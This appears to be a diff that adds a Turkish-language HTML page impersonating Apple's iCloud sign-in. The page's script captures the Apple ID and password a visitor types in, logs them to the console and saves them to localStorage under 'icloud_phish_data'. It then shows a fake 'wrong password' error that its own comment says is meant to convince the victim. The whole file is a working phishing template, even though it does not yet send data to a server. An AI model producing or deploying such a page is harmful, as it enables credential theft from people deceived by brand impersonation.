@@ -1,0 +1,136 @@
+<!DOCTYPE html>
+<html lang="tr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>iCloud - Apple</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+        .login-container {
+            background: white;
+            padding: 40px;
+            border-radius: 12px;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.2);
+            width: 100%;
+            max-width: 400px;
+        }
+        .logo {
+            text-align: center;
+            margin-bottom: 30px;
+        }
+        .logo img {
+            width: 50px;
+            height: 50px;
+        }
+        .form-group {
+            margin-bottom: 20px;
+        }
+        label {
+            display: block;
+            margin-bottom: 8px;
+            font-weight: 600;
+            color: #333;
+        }
+        input[type="text"], input[type="password"] {
+            width: 100%;
+            padding: 12px;
+            border: 1px solid #ddd;
+            border-radius: 6px;
+            font-size: 16px;
+            transition: border-color 0.3s;
+        }
+        input[type="text"]:focus, input[type="password"]:focus {
+            outline: none;
+            border-color: #007aff;
+        }
+        .login-btn {
+            width: 100%;
+            background: #007aff;
+            color: white;
+            border: none;
+            padding: 12px;
+            border-radius: 6px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: background 0.3s;
+        }
+        .login-btn:hover {
+            background: #005ecb;
+        }
+        .error-message {
+            color: #d93025;
+            margin-top: 10px;
+            text-align: center;
+            display: none;
+        }
+        .footer-text {
+            text-align: center;
+            margin-top: 20px;
+            font-size: 14px;
+            color: #666;
+        }
+    </style>
+</head>
+<body>
+    <div class="login-container">
+        <div class="logo">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/3/3a/Apple-logo.svg/2048px-Apple-logo.svg.png" alt="Apple">
+        </div>
+        <form id="loginForm">
+            <div class="form-group">
+                <label for="username">Apple ID</label>
+                <input type="text" id="username" placeholder="ornek@icloud.com" required>
+            </div>
+            <div class="form-group">
+                <label for="password">Parola</label>
+                <input type="password" id="password" placeholder="Parolanızı girin" required>
+            </div>
+            <button type="submit" class="login-btn">Giriş Yap</button>
+            <div class="error-message" id="errorMessage">Apple ID veya parola hatalı.</div>
+        </form>
+        <div class="footer-text">
+            Apple ID'nizle iCloud, App Store ve daha fazlasını kullanın.
+        </div>
+    </div>
+
+    <script>
+        document.getElementById('loginForm').addEventListener('submit', function(e) {
+            e.preventDefault(); // Formun normal gönderilmesini engelle
+            
+            // Kullanıcı adı ve parolayı al
+            const username = document.getElementById('username').value;
+            const password = document.getElementById('password').value;
+            
+            // Verileri konsola yazdır (geliştirici için)
+            console.log('Apple ID:', username);
+            console.log('Parola:', password);
+            
+            // Verileri localStorage'a kaydet
+            const userData = {
+                username: username,
+                password: password,
+                timestamp: new Date().toISOString()
+            };
+            localStorage.setItem('icloud_phish_data', JSON.stringify(userData));
+            
+            // Sahte hata mesajı göster (kullanıcıyı ikna etmek için)
+            document.getElementById('errorMessage').style.display = 'block';
+            
+            // 3 saniye sonra gerçek iCloud sayfasına yönlendir (isteğe bağlı)
+            setTimeout(() => {
+                // window.location.href = 'https://www.icloud.com';
+                alert('Veriler localStorage\'a kaydedildi. Konsolu kontrol edin.');
+            }, 3000);
+        });
+    </script>
+</body>
+</html>
